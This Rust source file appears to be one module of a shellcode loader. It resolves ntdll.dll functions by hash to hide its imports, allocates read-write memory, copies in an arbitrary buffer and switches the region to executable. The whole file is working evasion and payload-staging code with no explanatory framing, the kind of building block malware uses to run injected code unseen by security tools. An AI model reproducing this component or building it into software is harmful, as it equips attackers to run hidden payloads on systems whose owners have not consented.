//! `NtAllocateVirtualMemory` (RW) -> fill -> `NtProtectVirtualMemory` (RX).

use core::ffi::c_void;
use core::ptr;

use crate::hash::hash_str;
use crate::native::{get_export_by_hash, get_module_base_by_hash};
use crate::shared::{
    current_process, is_success, NtAllocateVirtualMemory, NtFreeVirtualMemory,
    NtProtectVirtualMemory, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE,
};
use windows_sys::Win32::Foundation::HANDLE;

use super::{AllocatedRegion, Allocator};

pub struct Memory;

impl Allocator for Memory {
    fn allocate(buffer: &[u8]) -> Option<AllocatedRegion> {
        unsafe {
            let ntdll = get_module_base_by_hash(hash_str("ntdll.dll"));
            if ntdll.is_null() {
                return None;
            }
            let f_alloc = get_export_by_hash(ntdll, hash_str("NtAllocateVirtualMemory"));
            let f_protect = get_export_by_hash(ntdll, hash_str("NtProtectVirtualMemory"));
            if f_alloc.is_null() || f_protect.is_null() {
                return None;
            }
            let alloc: NtAllocateVirtualMemory = core::mem::transmute(f_alloc);
            let protect: NtProtectVirtualMemory = core::mem::transmute(f_protect);

            let mut region: *mut c_void = ptr::null_mut();
            let mut size: usize = buffer.len();
            let status = alloc(
                current_process(),
                &mut region,
                0,
                &mut size,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            if !is_success(status) || region.is_null() {
                return None;
            }
            core::ptr::copy_nonoverlapping(buffer.as_ptr(), region as *mut u8, buffer.len());

            let mut old: u32 = 0;
            size = buffer.len();
            let status = protect(
                current_process(),
                &mut region,
                &mut size,
                PAGE_EXECUTE_READ,
                &mut old,
            );
            if !is_success(status) {
                if let Some(free_fn) = get_free(ntdll) {
                    let mut z: usize = 0;
                    free_fn(current_process(), &mut region, &mut z, MEM_RELEASE);
                }
                return None;
            }
            Some(AllocatedRegion {
                region,
                handle: 0 as HANDLE,
            })
        }
    }

    fn release(r: AllocatedRegion) {
        if r.region.is_null() {
            return;
        }
        unsafe {
            let ntdll = get_module_base_by_hash(hash_str("ntdll.dll"));
            if ntdll.is_null() {
                return;
            }
            if let Some(free_fn) = get_free(ntdll) {
                let mut region = r.region;
                let mut z: usize = 0;
                free_fn(current_process(), &mut region, &mut z, MEM_RELEASE);
            }
        }
    }
}

unsafe fn get_free(ntdll: *mut c_void) -> Option<NtFreeVirtualMemory> {
    let f = get_export_by_hash(ntdll, hash_str("NtFreeVirtualMemory"));
    if f.is_null() {
        None
    } else {
        Some(core::mem::transmute(f))
    }
}
